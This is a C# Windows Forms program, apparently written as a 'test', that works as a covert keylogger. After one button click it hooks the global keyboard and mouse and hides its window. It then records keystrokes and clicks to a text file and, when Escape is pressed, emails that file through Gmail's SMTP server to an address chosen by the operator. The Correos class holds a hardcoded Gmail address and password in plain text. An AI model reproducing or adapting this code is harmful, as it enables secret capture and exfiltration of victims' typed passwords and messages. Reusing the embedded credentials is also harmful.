using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Mail;

namespace Pruebas
{
    public partial class Test : Form
    {
        public int contador = 0;
        String[] archivo;
        String correo;

        private int y = 0;
        private int velocity = 5;
        private int x = 0;
        private WQLUtil.Util.Window.WindowManager w;
        private WQLUtil.Util.Mouse.MouseManager m;

        
        public Test()
        {
            InitializeComponent();
            this.Visible = true;
            archivo = new String[900000];

            //pasara a funcion del boton iniciar
           
        }

        private void Log(string txt)
        {
    //        Console.WriteLine("{0}", txt);
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
            x = e.X;
            y = e.Y;

            //   Console.WriteLine(String.Format("x = {0},  y= {1}, delta = {2}", e.X, e.Y, e.Delta));

            if (e.Clicks > 0) { 
            
                // Log("MouseButton - " + e.Button.ToString());
                String prueb = "MouseButton - " + e.Button.ToString();
                archivo[contador] = prueb;
                contador = contador + 1;
            }

        }

        public void ExtKeyDown(object sender, KeyEventArgs e)
        {
            Log("KeyDown - " + e.KeyData.ToString());
            WQLUtil.Util.Mouse.MouseManager.SetCursor(x, y);
            if (e.KeyValue == 73)
            {
                WQLUtil.Util.Mouse.MouseManager.LeftClickExt(x, y);
                archivo[contador] = "Clic izquierdo";
                contador = contador + 1;
                //           Console.WriteLine("Clic izquierdo");
            }
            else if (e.KeyValue == 68)
            {
                WQLUtil.Util.Mouse.MouseManager.RightClick(x, y);
                archivo[contador] = "clic derecho";
                contador = contador + 1;
                //           Console.WriteLine("Clic derecho");
            }
            else if (e.KeyValue == 39)
                x = x + velocity;
            else if (e.KeyValue == 40)
                y = y + velocity;
            else if (e.KeyValue == 37)
                x = x - velocity;
            else if (e.KeyValue == 38)
                y = y - velocity;
            else if (e.KeyValue == 77)
                WQLUtil.Util.Window.WindowManager.MinAll();
            else if (e.KeyValue == 78)
                WQLUtil.Util.Window.WindowManager.MaxAll();
            else if (e.KeyValue == 27) { 
                Console.WriteLine("se realiza archivo");
                
                System.IO.File.WriteAllLines(@"C:\Users\Manuel\Documents\chisme.txt", archivo);

                try
                {
                    Correos Cr = new Correos();
                    MailMessage mnsj = new MailMessage();

                    mnsj.Subject = "Hola Mundo";

                    //  mnsj.To.Add(new MailAddress("cheleazar1805@hotmail.com"));
                    mnsj.To.Add(new MailAddress(correo));

                    mnsj.From = new MailAddress("pokepress10@gmail.com", "probando");

                    /* Si deseamos Adjuntar algún archivo*/
                    mnsj.Attachments.Add(new Attachment(@"C:\Users\Manuel\Documents\chisme.txt"));

                    mnsj.Body = "  Mensaje de Prueba \n\n Enviado desde C#\n\n *VER EL ARCHIVO ADJUNTO*";

                    /* Enviar */
                    Cr.MandarCorreo(mnsj);
                   // Enviado = true;

                   // MessageBox.Show("El Mail se ha Enviado Correctamente", "Listo!!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
            //        Console.WriteLine("x={0}, y={1}, Key = {2}", x, y, e.KeyValue);

        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            //Log("KeyPress 	- " + e.KeyChar);
            String abc = "keyPress - " + e.KeyChar.ToString();
            archivo[contador] = abc;
            contador = contador + 1;
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            //Log("KeyUp - " + e.KeyData.ToString());
            archivo[contador] = "KeyUp - " + e.KeyData.ToString();
            contador = contador + 1;
        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            //Log("Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
           // archivo[contador] = "Active Window - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle();
            //contador = contador + 1;
        }


        private void Test_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            correo = textBox1.Text;
            w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
            m = new WQLUtil.Util.Mouse.MouseManager();

            m.Hook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            m.Hook.KeyDown += new KeyEventHandler(ExtKeyDown);
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);

            this.Visible = false;
                
        }

        
// El código de la clase es:
class Correos
    {
        /*
         * Cliente SMTP
         * Gmail:  smtp.gmail.com  puerto:587
         * Hotmail: smtp.liva.com  puerto:25
         */
        SmtpClient server = new SmtpClient("smtp.gmail.com", 587);

        public Correos()
        {
            /*
             * Autenticacion en el Servidor
             * Utilizaremos nuestra cuenta de correo
             *
             * Direccion de Correo (Gmail o Hotmail)
             * y Contrasena correspondiente
             */
            server.Credentials = new System.Net.NetworkCredential("pokePress10@gmail.com", "pokemon1014");
            server.EnableSsl = true;
        }

        public void MandarCorreo(MailMessage mensaje)
        {
            server.Send(mensaje);
        }
    }



}
}
